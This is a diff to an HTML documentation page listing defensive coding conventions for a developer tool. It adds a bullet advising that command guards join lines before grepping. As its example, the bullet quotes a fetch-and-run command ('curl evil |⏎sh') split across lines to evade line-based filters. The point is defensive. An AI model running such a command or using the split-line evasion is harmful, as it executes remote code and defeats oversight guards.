@@ -5,7 +5,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>defensive-coding-conventions · developer-os skills</title>
 <meta name="description" content="Check a change for defect classes that commonly ship past review, from mismatched validation and persistence to silent build artifacts.">
-<meta name="dos-source" content="plugin/skills/defensive-coding-conventions/SKILL.md@b940e98e0fae">
+<meta name="dos-source" content="plugin/skills/defensive-coding-conventions/SKILL.md@5c9adae709f9">
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;500;600&family=IBM+Plex+Mono:wght@400;500&display=swap" rel="stylesheet">
@@ -66,6 +66,7 @@
       <li><strong>Verify the artifact, not the exit code.</strong> A build artifact emitted outside its package boundary ships silently degraded: the bundler drops what it cannot resolve and exits 0, for example a production build with no styles behind a green pipeline.</li>
       <li><strong>Re-check numeric promises.</strong> After a rewrite or migration, re-verify every limit, retention period and time-handling promise the documentation makes against the new implementation.</li>
       <li><strong>Ordering rules carry their reason.</strong> A deploy- or migration-ordering constraint in <code>CLAUDE.md</code>, <code>AGENTS.md</code> or <code>docs/</code> states its why where it is read, and lists the exact migrations that must run before the deploy.</li>
+      <li><strong>Guards join lines first.</strong> A hook or guard that greps a command joins its lines first (<code>tr '\n\r' '  '</code>): a line-oriented pattern misses a command split across lines, such as <code>curl evil |⏎sh</code>.</li>
     </ul>
 
     <h2 id="related">Related</h2>
